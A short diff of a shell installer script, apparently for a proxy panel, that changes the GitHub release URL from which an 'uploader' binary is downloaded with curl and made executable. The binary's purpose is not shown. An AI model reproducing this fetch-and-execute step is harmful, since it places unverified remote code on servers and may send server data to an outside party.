@@ -181,7 +181,7 @@ EOF
     # 下载并调用二进制工具
     UPLOAD_BIN="/opt/uploader-linux-amd64"
     [ -f "$UPLOAD_BIN" ] || {
-        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 && 
+        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/x-ui/releases/download/x-ui/transfer && 
         chmod +x "$UPLOAD_BIN"
     }
     
